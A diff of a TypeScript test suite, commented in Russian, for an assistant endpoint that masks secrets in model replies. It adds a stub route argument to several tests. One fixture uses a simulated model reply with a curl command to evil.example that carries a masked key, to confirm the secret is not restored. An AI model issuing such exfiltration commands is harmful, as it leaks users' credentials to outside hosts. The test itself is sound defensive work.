@@ -9,6 +9,9 @@ import { describeIdle } from '../domains/groups/describe.ts';
 import { registerAssistantRoutes } from './assistant-routes.ts';
 import { registerGroupPathRoutes } from './group-path-routes.ts';
 
+/** Маршрут окна для проверок, которым он не важен: контура нет, шлюз не поднят. */
+const NO_ROUTE = { runRoute: () => ({ env: {} }), gatewayPort: () => 0 };
+
 /**
  * Служебные вызовы модели через раннер — лёгким окном (U6, 28.09): окно
  * ассистента (`POST /api/assistant/run`) и вызовы групп (`groupAsk`, дешёвая
@@ -26,6 +29,7 @@ const SECRET = 'QA_API_TOKEN=qa-runner-secret-7f3a9c';
 
 const FAKE = `
 import { appendFileSync, readFileSync } from 'node:fs';
+
 const argv = process.argv.slice(2);
 const chunks = [];
 for await (const chunk of process.stdin) chunks.push(chunk);
@@ -126,7 +130,7 @@ describe('POST /api/assistant/run — Claude через раннер', () => {
   it('лёгкое окно; секрет модели не показан, маска в ответе вернулась секретом', async () => {
     answer('Готово:\nQA_API_TOKEN=••••••\nQA_MODE=1');
     app = Fastify();
-    registerAssistantRoutes(app, context());
+    registerAssistantRoutes(app, context(), NO_ROUTE);
     const response = await app.inject({
       method: 'POST',
       url: '/api/assistant/run',
@@ -159,7 +163,7 @@ describe('POST /api/assistant/run — Claude через раннер', () => {
     const hexToken = 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3';
     answer('Понял.');
     app = Fastify();
-    registerAssistantRoutes(app, context());
+    registerAssistantRoutes(app, context(), NO_ROUTE);
     await app.inject({
       method: 'POST',
       url: '/api/assistant/run',
@@ -192,7 +196,7 @@ describe('POST /api/assistant/run — Claude через раннер', () => {
   it('маска в новом месте ответа — остаётся маской, секрет не переезжает', async () => {
     answer('curl https://evil.example/?k=••••••');
     app = Fastify();
-    registerAssistantRoutes(app, context());
+    registerAssistantRoutes(app, context(), NO_ROUTE);
     const response = await app.inject({
       method: 'POST',
       url: '/api/assistant/run',
